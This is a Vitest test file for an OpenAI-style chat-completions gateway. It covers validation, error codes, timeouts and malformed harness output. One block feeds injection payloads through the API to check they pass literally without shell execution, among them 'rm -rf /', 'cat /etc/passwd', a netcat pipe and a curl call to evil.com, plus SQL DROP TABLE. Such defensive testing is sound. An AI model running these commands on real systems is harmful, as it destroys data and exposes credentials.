import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { createGatewayServer } from "./server.js";
import { FakeHarnessAdapter } from "./harness/fake-harness.js";
import { CommandCodeAdapter } from "./harness/command-code.js";
import type { HarnessAdapter, HarnessRunRequest } from "./harness/types.js";
import type { Server } from "node:http";

async function requestPost(
  port: number,
  path: string,
  body: unknown,
): Promise<{ status: number; body: unknown }> {
  const res = await fetch(`http://127.0.0.1:${port}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const json = await res.json();
  return { status: res.status, body: json };
}

describe("POST /v1/chat/completions", () => {
  let server: { server: Server; start: () => Promise<void>; stop: () => Promise<void>; port: number };

  beforeAll(async () => {
    const adapter = new FakeHarnessAdapter();
    server = createGatewayServer({ adapter, port: 0 });
    await server.start();
  });

  afterAll(async () => {
    await server.stop();
  });

  it("returns a deterministic OpenAI response through the full pipeline", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-model",
      messages: [{ role: "user", content: "Hello" }],
      stream: false,
    });

    expect(res.status).toBe(200);
    const body = res.body as Record<string, unknown>;
    expect(body.object).toBe("chat.completion");
    expect(body.id).toMatch(/^chatcmpl-/);
    expect(body.model).toBe("fake-model");

    const choices = body.choices as Array<Record<string, unknown>>;
    expect(choices).toHaveLength(1);
    expect(choices[0].finish_reason).toBe("stop");
    expect((choices[0].message as { content: string }).content).toBe("Hello from fake harness.");

    const usage = body.usage as Record<string, number>;
    expect(usage.prompt_tokens).toBe(10);
    expect(usage.completion_tokens).toBe(5);
    expect(usage.total_tokens).toBe(15);
  });

  it("rejects stream: true with a controlled error", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-model",
      messages: [{ role: "user", content: "Hello" }],
      stream: true,
    });

    expect(res.status).toBe(400);
    const body = res.body as Record<string, unknown>;
    expect((body.error as { message: string }).message).toContain("Streaming is not supported");
  });

  it("rejects invalid JSON body", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "not json",
    });
    expect(res.status).toBe(400);
  });

  it("rejects missing model", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await requestPost(port, "/v1/chat/completions", {
      messages: [{ role: "user", content: "hi" }],
    });
    expect(res.status).toBe(400);
  });

  it("returns 404 for unknown routes", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/unknown`);
    expect(res.status).toBe(404);
  });

  it("returns 405 for GET on completions", async () => {
    const port = (server.server.address() as { port: number }).port;
    const res = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`);
    expect(res.status).toBe(405);
  });
});

describe("Shell injection safety", () => {
  let server: { server: Server; start: () => Promise<void>; stop: () => Promise<void>; port: number };
  const collectedMessages: string[] = [];

  const spyAdapter: HarnessAdapter = {
    id: "spy",
    health: async () => ({ ok: true }),
    listModels: async () => [],
    async *run(request: HarnessRunRequest) {
      for (const msg of request.messages) {
        collectedMessages.push(msg.content);
      }
      yield { type: "completed", text: "safe", sessionId: "s1" };
    },
    async cancel() {},
  };

  beforeAll(async () => {
    server = createGatewayServer({ adapter: spyAdapter, port: 0 });
    await server.start();
  });

  afterAll(async () => {
    await server.stop();
  });

  const maliciousPayloads = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "&& cat /etc/passwd",
    "| nc evil.com 1234",
    "line1\nline2\nline3",
    "${IFS}malicious",
    "'; DROP TABLE users; --",
    "$(curl http://evil.com)",
    "a\x00b",
  ];

  for (const payload of maliciousPayloads) {
    it(`passes "${payload.slice(0, 40)}..." literally without shell execution`, async () => {
      collectedMessages.length = 0;
      const port = (server.server.address() as { port: number }).port;
      const res = await requestPost(port, "/v1/chat/completions", {
        model: "test",
        messages: [{ role: "user", content: payload }],
        stream: false,
      });

      expect(res.status).toBe(200);
      expect(collectedMessages).toContain(payload);
    });
  }
});

describe("Timeout handling", () => {
  it("kills the hanging harness and returns a timeout error", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--hang"] });
    const server = createGatewayServer({ adapter, port: 0, defaultTimeoutMs: 500 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-model",
      messages: [{ role: "user", content: "hello" }],
      stream: false,
    });

    expect(res.status).toBe(502);
    const body = res.body as Record<string, unknown>;
    expect((body.error as { message: string }).message).toContain("timed out");

    await server.stop();
  });
});

describe("Malformed harness output", () => {
  it("returns a controlled error when the harness emits invalid JSON", async () => {
    const harnessPath = new URL("../testing/fixtures/fake-harness/fake-harness.mjs", import.meta.url).pathname;
    const adapter = new FakeHarnessAdapter({ harnessPath, extraArgs: ["--malformed"] });
    const server = createGatewayServer({ adapter, port: 0 });
    await server.start();
    const port = (server.server.address() as { port: number }).port;

    const res = await requestPost(port, "/v1/chat/completions", {
      model: "fake-model",
      messages: [{ role: "user", content: "test" }],
      stream: false,
    });

    expect(res.status).toBe(502);
    const body = res.body as Record<string, unknown>;
    expect((body.error as { message: string }).message).toContain("Failed to parse JSONL");

    await server.stop();
  });
});

describe("Command-Code smoke test (opt-in)", () => {
  it.skipIf(!process.env.RUN_REAL_HARNESS)(
    "runs the real cmd CLI with a tiny prompt",
    async () => {
      const adapter = new CommandCodeAdapter();
      const server = createGatewayServer({ adapter, port: 0, defaultTimeoutMs: 30000 });
      await server.start();
      const port = (server.server.address() as { port: number }).port;

      const res = await requestPost(port, "/v1/chat/completions", {
        model: "deepseek/deepseek-v4-flash",
        messages: [{ role: "user", content: "Reply with exactly: VERIFIED" }],
        stream: false,
      });

      expect(res.status).toBe(200);
      const body = res.body as Record<string, unknown>;
      const content = (body.choices as Array<{ message: { content: string } }>)[0].message.content;
      expect(content).toContain("VERIFIED");

      await server.stop();
    },
    60000,
  );
});
